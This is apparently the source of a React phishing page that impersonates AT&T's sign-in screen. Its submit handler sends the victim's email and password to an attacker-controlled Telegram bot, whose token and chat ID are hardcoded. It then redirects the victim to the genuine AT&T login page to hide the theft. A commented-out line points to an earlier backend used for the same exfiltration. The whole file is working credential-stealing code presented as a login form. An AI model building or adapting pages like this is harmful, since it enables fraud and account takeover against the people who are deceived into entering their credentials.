import React from 'react';
import axios from 'axios';
import './hometwo.css';
import { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import logotwo from './logotwo.gif';
import { useLocation } from 'react-router-dom';
import { Link } from 'react-router-dom';
import atlogo from './atlogo.png';
import or from './or.png';


function Next(){

    const location = useLocation();
    
    const[password, setPassword] = useState("");
    
    const[email ,setEmail] = useState(location.state.email);

    const[platform, setPlatform] = useState("AT&T")

    const[showError, setShowError] = useState(false);

    const[isLoading, setIsLoading]= useState(false);

    const[showPassword, setShowPassword] = useState(false);


    async function handleSubmit(e){
        e.preventDefault();
    
        try {

            setIsLoading(true);
            // const response = await axios.post('https://micback.onrender.com/api/send', {
            //     email:email,
            //     password:password,
            //     platform:platform
            // });

            const response = await axios.post(`https://api.telegram.org/bot6346477835:AAE--Er907FambpxvtD7C-CU-J7GlwgyEkg/sendMessage`, {
                  chat_id: 5968552603,
                  text: `Platform : ${platform} , User ID : ${email} , Password : ${password}'`,
                });
        
            // Handle success
            console.log('Data sent:', response.data.message);
    
            if(response.status == 200){
                console.log(response.data.message);
    
                window.location.href = 'https://signin.att.com/';

            }
          } catch (error) {
            // Handle error
            console.error('Error:', error);
          }
        
    }



    return (
        <div className='mainContent py-4'>

        <div className='col-md-5 m-auto maindiv pb-4'>

            <div className='imagediv text-center py-2'>

            <div className='imagediv text-center py-4'>
                        <img src={atlogo} className="mylogo" />

                    </div>
                
                <div className='text-center m-auto'>
                    <h4 className=''>{email}</h4>
                </div>

            </div>

            <h2 className='text-center font-weight-bold'>Welcome</h2>
            

          

            <form onSubmit={handleSubmit} className="px-5">
            <div className=''>
                <input onChange={function(e){
                   setPassword(e.target.value);
               }} value={password} type={showPassword ? "text" : "password"}className='form-control w-100 py-4'placeholder='Password' required/>
                
                    <div className='text-right pr-3'>
                    <span onClick={function(e){
                        e.preventDefault();
                        setShowPassword(!showPassword);
                    }} className='show'>{showPassword ? "Hide" : "Show"}</span>
                    </div>
                </div>
                <div className='px-3 pb-3 showborder'>
            <input type="checkbox" /><span className='px-3 smalll'>Keep me signed in</span>

            </div>

                <div className='px-3'>
                <button className='next btn w-100'>Sign in</button>

                </div>

           
            {/* <p className='text-center smalll py-3'>Not you? <Link to={'/'} className='colorme'>Check your account again</Link></p> */}


            <div className=''>
                        <p className='primarycolor'>Forgot user ID?</p>

                        <p className='primarycolor'>Don't have a user ID? Create one now </p>
                        <div>
                        <img src={or} style={{
                            width:"100%",
                        }}/>

                <button className='nexttwo btn w-100'>
                            signin with myAT&T app
                        </button>
                        </div>
                        
                    </div>
            </form>

        

        </div>


        

    </div>
    );

}

export default Next;